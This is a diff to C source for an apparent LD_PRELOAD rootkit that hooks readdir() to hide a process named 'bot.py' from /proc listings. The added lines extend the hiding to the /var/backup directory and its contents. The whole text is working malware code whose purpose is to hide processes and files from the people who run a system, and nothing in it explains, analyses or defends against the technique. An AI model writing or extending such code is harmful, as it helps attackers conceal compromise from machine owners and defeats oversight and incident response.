@@ -15,6 +15,8 @@
  * Every process with this name will be excluded
  */
 static const char* process_to_filter = "bot.py";
+static const char* dir_to_filter = "backup";
+static const char* whole_dir_to_filter = "/var/backup";
 
 /*
  * Get a directory name given a DIR* handle
@@ -91,6 +93,15 @@ struct dirent* readdir(DIR *dirp)                                       \
                 strcmp(dir_name, "/proc") == 0 &&                       \
                 get_process_name(dir->d_name, process_name) &&          \
                 strcmp(process_name, process_to_filter) == 0) {         \
+                continue;                                               \
+            }                                                           \
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
+                strcmp(dir_name, "/var") == 0 &&						\
+                strcmp(dir->d_name, dir_to_filter) == 0) {				\
+                continue;                                               \
+            }                                                           \
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
+                strcmp(dir_name, whole_dir_to_filter) == 0) {			\
                 continue;                                               \
             }                                                           \
         }                                                               \
